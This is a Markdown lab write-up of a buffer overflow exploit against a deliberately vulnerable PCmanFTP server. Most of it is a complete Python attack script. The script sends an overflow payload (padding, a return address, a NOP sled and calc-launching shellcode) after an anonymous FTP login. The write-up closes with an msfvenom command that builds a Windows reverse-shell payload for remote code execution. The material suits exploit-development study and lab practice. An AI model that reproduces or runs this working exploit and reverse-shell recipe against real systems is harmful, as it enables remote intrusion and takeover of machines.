# Buffer Overflow in PCmanFTP
---
## Step by step
### Software:

- Immunity Debugger
- mona.py
- VMware
- Notepad++
- PCmanFTP (modified to be vulnerable by Dreg)

### OS:

 - Windows 10 Pro
 - Kali Linux
 -----
 First we will explain how we have violated it and finally we will explain the complete exercise.
 ## First part: Let's understand the program
 This program has the vulnerability that when it receives a connection from a client and is sent more than X bytes at the start of the session, it gets corrupted and a BoF can be  carried out. 
In order to exploit it we are going to use a python script created by David Reguera (from now on we will call him Dreg) which creates the connection with the FTP server and sends X bytes at the beginning of the session. Let's see it:
````sh
#!/usr/bin/env python

from socket import *
from time import sleep
from sys import exit, exc_info
import os

print ("-") *40
print ("| PCman_N4CH-HCKr FTP Server v2.0.7 |")
print ("-") *40
print ("|                  thankss to Dreg! |")
print ("-") *40

os.system("ifconfig eth0 mtu 3000")

target_ip = "127.0.0.1"
port = int(21)

#This shellcode run a calculator
shellcode_calc = '\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0'

#badchars = 00 0a ad 0e 0f
#addres to jmp = 1010539F

current_shellcode = shellcode_calc

shellcode = '\x41' * 2011#padding
shellcode += '\x9f\x53\x10\x10' #retorno
shellcode += '\x90' * 20
shellcode += current_shellcode


print("\nshellcode content (size " + str(len(shellcode))  + " bytes):\n")
print(":".join("{:02x}".format(ord(c)) for c in shellcode))
print("\n")

target = inet_aton(target_ip)
target = inet_ntoa(target)

try:
    socket = socket(AF_INET, SOCK_STREAM)
except:
    print "\nError creating the network socket\n\n%s\n" % exc_info()       
    exit(1)    

try:
    print "Connecting to %s %d" % (target, port)
    socket.connect((target, port))
except:
    print "\nError connecting to %s\n\n%s\n" % (target, exc_info())
    exit(1)
    
print("Connected!")
sleep(1)
print(socket.recv(1000))
sleep(1)
print("Logging as anonymous")
socket.send('USER anonymous\r\n')
sleep(1)
print(socket.recv(1024))
print("Empty password")
sleep(1)
socket.send('PASS\r\n')
sleep(1)
print(socket.recv(1024))
try:
    print "Sending evil packet to %s %d (length: %d bytes), please wait a few secs...." % (target, port, len(shellcode))
    socket.send(shellcode)
    sleep(4)
    socket.close()

except:
    print "\nError sending evil packet to %s\n\n%s\n" % (target, exc_info())
    exit(1)


print("\n\nDone! :-)\n")


sleep(1)
````

Once we run this program, we will launch the script and get the calculator to run. Logically it is a very simple example but if instead of that shellcode we put a reverse shellcode we could get remote code execution. Example of how to create our reverse shellcode with MSFVENOM:
````sh
# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/alpha_mixed LHOST=127.0.0.1 LPORT=21  -f python
````

